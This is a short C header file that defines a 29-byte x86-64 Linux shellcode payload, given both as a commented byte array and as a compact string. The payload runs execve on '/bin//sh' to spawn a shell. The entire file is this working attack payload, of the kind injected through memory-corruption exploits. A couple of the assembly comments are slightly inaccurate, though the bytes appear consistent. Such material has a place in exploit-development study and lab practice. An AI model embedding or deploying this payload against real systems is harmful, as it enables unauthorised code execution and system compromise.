#ifndef HASH_SHELLCODE_H
#define HASH_SHELLCODE_H

const char code[] =
		"\x6a\x3b"                      // push 59
		"\x58"                          // pop rax
		"\x48\x31\xff"                  // xor rdi, rdi ; (resulting in NULL)
		"\x57"                          // push rdi
		"\x48\xbf\x2f\x62\x69\x6e\x2f"  // mov rdi, 0x68732f6e69622f
		"\x2f\x73\x68"
		"\x57"                          // push rdi
		"\x48\x89\xe7"                  // mov rdi, rsp
		"\x48\x31\xf6"                  // xor rsi, rsi ; NASM can make this esi for some reason, resulting in a crash - make sure its rsi in the objdump
		"\x48\x31\xd2"                  // xor rdx, rdx ; NASM can make this esi for some reason, resulting in a crash - make sure its rdx in the objdump
		"\x0f\x05"                      // syscall
;

const char compact[] = "\x6a\x3b\x58\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f\x05";

const unsigned char length = 29;

#endif //HASH_SHELLCODE_H
